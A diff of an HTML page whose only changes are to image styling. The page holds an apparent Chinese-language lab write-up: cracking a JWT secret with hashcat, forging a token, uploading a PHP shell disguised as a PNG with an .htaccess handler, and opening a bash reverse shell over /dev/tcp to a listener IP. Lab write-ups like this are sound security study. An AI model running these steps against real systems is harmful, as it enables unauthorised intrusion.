@@ -341,7 +341,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <hr>
 <h2>漏洞利用过程</h2>
 <p>主页是一个静态页面，啥也干不了，看源码有发现 API 路径，像是 Base64 编码：</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1"><img width="936" height="328" alt="Image" src="https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1"><img width="936" height="328" alt="Image" src="https://github.com/user-attachments/assets/77ea71a1-51a4-446f-8df3-e667d1ec09c1" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>NzQyMjE=<span class="pl-pds">"</span></span> <span class="pl-k">|</span> base64 -d
 <span class="pl-c"><span class="pl-c">#</span> 输出：74221</span></pre></div>
 <p>访问 <code class="notranslate">/74221/</code> 是一个登录页面，继续进行目录扫描：</p>
@@ -351,13 +351,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 /dashboard.php        (Status: 302)
 </code></pre>
 <p>登录账号：test  密码：123456</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3"><img width="1840" height="939" alt="Image" src="https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3"><img width="1840" height="939" alt="Image" src="https://github.com/user-attachments/assets/1927c67d-bbe8-458f-b453-4555f8d3f1d3" style="max-width: 100%;"></a></p>
 <p>登录后发现是 JWT 身份验证，抓取 token 后尝试使用 hashcat 破解：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</pre></div>
 <pre lang="text" class="notranslate"><code class="notranslate">候选密钥：jwtsecret123
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec"><img width="1919" height="616" alt="Image" src="https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec" style="max-width: 100%; height: auto;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d"><img width="1915" height="608" alt="Image" src="https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec"><img width="1919" height="616" alt="Image" src="https://github.com/user-attachments/assets/2b10dfd8-cd8e-401f-94b6-534779f627ec" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d"><img width="1915" height="608" alt="Image" src="https://github.com/user-attachments/assets/9709ab51-e289-43e3-86c9-b35abafe7c5d" style="max-width: 100%;"></a></p>
 <p>忘截图了，上面token中的sub是上传目录把123改成999，不然可能上传不成功<br>
 使用伪造 token 后页面出现上传功能，上传如下两个文件：</p>
 <p><strong>shell.png</strong></p>
@@ -368,9 +368,9 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 	<span class="pl-k">SetHandler</span> <span class="pl-e">application/x-httpd-php</span>
 &lt;/<span class="pl-e">IfModule</span>&gt;</pre></div>
 <p>访问 payload 后执行：</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5"><img width="917" height="111" alt="Image" src="https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5"><img width="917" height="111" alt="Image" src="https://github.com/user-attachments/assets/86155986-3b43-4b84-abfa-48ab9d8936e5" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-text-html-php"><pre class="notranslate">cmd=<span class="pl-en">system</span>(<span class="pl-s">"<span class="pl-s">/usr/bin/bash -c '/usr/bin/bash -i &gt;&amp;/dev/tcp/192.168.218.148/1234 0&gt;&amp;1'</span>"</span>);</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1"><img width="924" height="221" alt="Image" src="https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1"><img width="924" height="221" alt="Image" src="https://github.com/user-attachments/assets/63182291-07e6-4fc7-84e8-416ef9c24fe1" style="max-width: 100%;"></a></p>
 <h2>权限提升分析</h2>
 <p>在 pentester 用户主目录中找到 <code class="notranslate">.note</code> 文件，结合 <code class="notranslate">/etc/passwd</code> 中的信息<br>
 但是我是想了很久也不知道这在提示什么，还是GPT好使，GPT告诉我可能与加密，隐写，凯撒密码这些有关，然后我开始对照这些语句的原文开始猜测，然后又浪费了很多时间，也没解出来，最后看了佬的wp，原来是找隐藏文件</p>
